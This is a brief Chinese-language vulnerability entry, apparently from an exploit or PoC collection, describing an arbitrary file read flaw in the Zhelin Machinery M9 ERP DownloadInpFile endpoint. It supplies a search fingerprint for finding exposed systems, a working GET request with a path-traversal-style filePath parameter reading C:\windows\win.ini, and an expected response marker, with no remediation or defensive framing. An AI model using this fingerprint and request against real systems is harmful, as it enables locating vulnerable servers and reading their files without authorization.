# 哲霖机械M9ERPDownloadInpFile任意文件读取漏洞

哲霖机械M9ERPDownloadInpFile ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="Api/UserApi/GetUserName"`
- **请求**：`GET /Basics/DownloadInpFile?filePath=C:\windows\win.ini HTTP/1.1`
- **响应特征**：200 [Mail]